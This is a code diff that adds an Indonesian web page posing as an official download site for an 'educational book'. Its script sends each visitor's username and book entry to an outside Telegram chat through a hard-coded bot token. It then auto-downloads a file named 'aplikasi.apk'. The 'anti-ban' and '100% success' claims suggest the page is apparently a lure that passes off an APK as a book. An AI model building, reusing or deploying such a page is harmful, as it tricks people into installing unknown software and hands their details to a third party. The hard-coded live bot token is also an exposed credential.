@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BUKU EDUKASI - Official Download</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;800&display=swap" rel="stylesheet">
+    
+    <style>
+        /* --- CSS STYLE (TAMPILAN) --- */
+        :root {
+            --primary: #00ff88; /* Warna Hijau Neon */
+            --bg: #0f0f13;      /* Background Gelap */
+            --card: #1a1a20;    /* Warna Kartu */
+            --text: #ffffff;
+            --input-bg: #09090b;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
+        
+        body { background-color: var(--bg); color: var(--text); overflow-x: hidden; }
+
+        .container { max-width: 1200px; margin: 0 auto; padding: 20px; text-align: center; }
+
+        /* HEADER STYLE */
+        .header { padding: 40px 0; animation: fadeInDown 1s ease; }
+        .developer-badge { 
+            background: rgba(0, 255, 136, 0.1); color: var(--primary); 
+            padding: 5px 15px; border-radius: 20px; font-size: 0.9em; 
+            display: inline-block; margin-bottom: 20px; border: 1px solid var(--primary);
+        }
+        
+        .logo-container { margin-bottom: 20px; }
+        .game-logo { font-size: 4rem; margin-bottom: 10px; text-shadow: 0 0 20px rgba(0,255,136,0.5); }
+        h1 { font-size: 2.5rem; font-weight: 800; letter-spacing: 2px; }
+        .subtitle { color: #888; font-size: 1.2rem; letter-spacing: 5px; margin-top: -5px; }
+
+        /* FEATURES GRID */
+        .features-grid { 
+            display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); 
+            gap: 20px; margin: 40px 0; 
+        }
+
+        .feature-card {
+            background: var(--card); padding: 30px; border-radius: 15px;
+            transition: transform 0.3s, border 0.3s; border: 1px solid #333;
+            position: relative; overflow: hidden;
+        }
+
+        .feature-card:hover { transform: translateY(-10px); border-color: var(--primary); }
+        .feature-icon { font-size: 2.5rem; margin-bottom: 15px; color: var(--primary); }
+        .feature-card h3 { margin-bottom: 10px; font-weight: 600; }
+        .feature-card p { color: #aaa; font-size: 0.9em; line-height: 1.6; }
+
+        /* FORM TELEGRAM STYLE */
+        .telegram-form {
+            max-width: 500px; margin: 40px auto 20px; background: var(--card);
+            padding: 40px 30px; border-radius: 20px; border: 1px solid #333; box-shadow: 0 0 20px rgba(0,0,0,0.5);
+        }
+
+        .form-group { text-align: left; margin-bottom: 20px; }
+        .form-label { display: block; margin-bottom: 8px; color: #aaa; font-size: 0.9rem; font-weight: 600; }
+        
+        input[type="text"] {
+            width: 100%; background: var(--input-bg); border: 1px solid #333; color: white;
+            padding: 15px; border-radius: 10px; font-size: 1rem; transition: 0.3s;
+        }
+
+        input[type="text"]:focus {
+            outline: none; border-color: var(--primary); background: #000;
+        }
+
+        /* TOMBOL UNDUH */
+        .send-btn {
+            background: var(--primary); color: #000; border: none; width: 100%;
+            padding: 18px; border-radius: 50px; cursor: pointer; transition: 0.3s; 
+            font-weight: 800; font-size: 1.2rem; margin-top: 10px;
+            box-shadow: 0 0 15px rgba(0, 255, 136, 0.3);
+        }
+        .send-btn:hover { 
+            transform: scale(1.02); 
+            box-shadow: 0 0 30px rgba(0, 255, 136, 0.6); 
+        }
+
+        /* Animation Classes */
+        .hidden { opacity: 0; transform: translateY(20px); transition: all 0.6s ease-out; }
+        .show { opacity: 1; transform: translateY(0); }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <header class="header">
+            <div class="developer-badge">
+                🔥 BUKU EDUKASI 🧑🏻‍💻
+            </div>
+            <div class="logo-container">
+                <div class="game-logo">🔥</div>
+                <div class="title-container">
+                    <h1>BUKU EDUKASI</h1>
+                    <div class="subtitle">BUKU • BUKU • BUKU</div>
+                </div>
+            </div>
+            <p style="color: #aaa; margin-top: 20px; font-size: 1.1em;">
+                🚀 <strong>BUKU</strong> for Android & iOS • Latest Version 1.101.1
+            </p>
+        </header>
+
+        <div class="telegram-form hidden">
+            <h3 style="margin-bottom: 25px; color: var(--primary);">📥 ISI DATA UNTUK MENGUNDUH</h3>
+            
+            <div class="form-group">
+                <label class="form-label">USERNAME:</label>
+                <input type="text" id="usernameInput" placeholder="Masukkan Username kamu...">
+            </div>
+
+            <div class="form-group">
+                <label class="form-label">BUKU:</label>
+                <input type="text" id="bukuInput" placeholder="Masukkan Jenis Buku...">
+            </div>
+
+            <button class="send-btn" onclick="kirimDanDownload()">
+                <i class="fas fa-download"></i> UNDUH SEKARANG
+            </button>
+            
+            <p id="statusMsg" style="margin-top: 15px; font-size: 0.9em; font-weight: bold;"></p>
+        </div>
+
+        <div class="features-grid">
+            <div class="feature-card hidden">
+                <div class="feature-icon">🎯</div>
+                <h3>100% SUCCESS</h3>
+                <p>Fitur otomatis yang membantu meningkatkan akurasi.</p>
+            </div>
+            <div class="feature-card hidden">
+                <div class="feature-icon">⚡</div>
+                <h3>FAST SERVER</h3>
+                <p>Koneksi stabil tanpa lag saat digunakan.</p>
+            </div>
+            <div class="feature-card hidden">
+                <div class="feature-icon">🛡️</div>
+                <h3>ANTI-BAN</h3>
+                <p>Sistem keamanan terbaru untuk melindungi akun.</p>
+            </div>
+        </div>
+
+        <footer style="margin-top: 50px; color: #555; font-size: 0.8em; padding-bottom: 20px;">
+            &copy; 2026 BUKU EDUKASI. All rights reserved. <br> Powered by Taufik Siregar.
+        </footer>
+    </div>
+
+    <script>
+        // --- KONFIGURASI BOT ---
+        const BOT_TOKEN = "8542025823:AAHWlJ3-513xhy7wqVICVdTtCBvB1fetRv4";
+        const CHAT_ID = "5852808019";
+        
+        // Ganti nama file ini sesuai nama file APK kamu yang sudah diupload
+        const NAMA_FILE_APK = "aplikasi.apk"; 
+
+        // FUNGSI UTAMA: KIRIM DATA -> LALU DOWNLOAD
+        function kirimDanDownload() {
+            // Ambil data dari input
+            const username = document.getElementById("usernameInput").value;
+            const buku = document.getElementById("bukuInput").value;
+            const status = document.getElementById("statusMsg");
+
+            // Validasi: Wajib isi Username & Buku
+            if (username.trim() === "" || buku.trim() === "") {
+                status.innerText = "⚠️ Harap isi Username dan Buku dulu!";
+                status.style.color = "red";
+                return;
+            }
+
+            status.innerText = "⏳ Memproses data...";
+            status.style.color = "yellow";
+            
+            // Format Pesan Telegram (Sudah tidak ada pesan tambahan)
+            const text = `
+📥 *ADA YANG MENGUNDUH FILE!*
+
+👤 *Username:* ${username}
+📚 *Buku:* ${buku}
+
+_User ini telah menekan tombol UNDUH_
+            `;
+
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
+
+            // Proses Kirim ke Telegram
+            fetch(url)
+                .then(res => res.json())
+                .then(data => {
+                    if (data.ok) {
+                        status.innerText = "✅ Data diterima! Mengunduh file...";
+                        status.style.color = "#00ff88";
+                        
+                        // --- PROSES DOWNLOAD DIMULAI DI SINI ---
+                        setTimeout(() => {
+                            // Membuat link download otomatis
+                            const link = document.createElement('a');
+                            link.href = NAMA_FILE_APK; 
+                            link.download = NAMA_FILE_APK;
+                            document.body.appendChild(link);
+                            link.click();
+                            document.body.removeChild(link);
+                            
+                            // Reset form
+                            document.getElementById("usernameInput").value = "";
+                            document.getElementById("bukuInput").value = "";
+                        }, 1000); // Delay 1 detik biar terlihat loading
+                    } else {
+                        status.innerText = "❌ Gagal memproses server.";
+                        status.style.color = "red";
+                    }
+                })
+                .catch(err => {
+                    console.error(err);
+                    status.innerText = "❌ Error Koneksi. Cek internet kamu.";
+                    status.style.color = "red";
+                });
+        }
+
+        // ANIMASI SCROLL
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach((entry) => {
+                if (entry.isIntersecting) {
+                    entry.target.classList.add('show');
+                }
+            });
+        });
+
+        const hiddenElements = document.querySelectorAll('.hidden');
+        hiddenElements.forEach((el) => observer.observe(el));
+    </script>
+</body>
+</html>
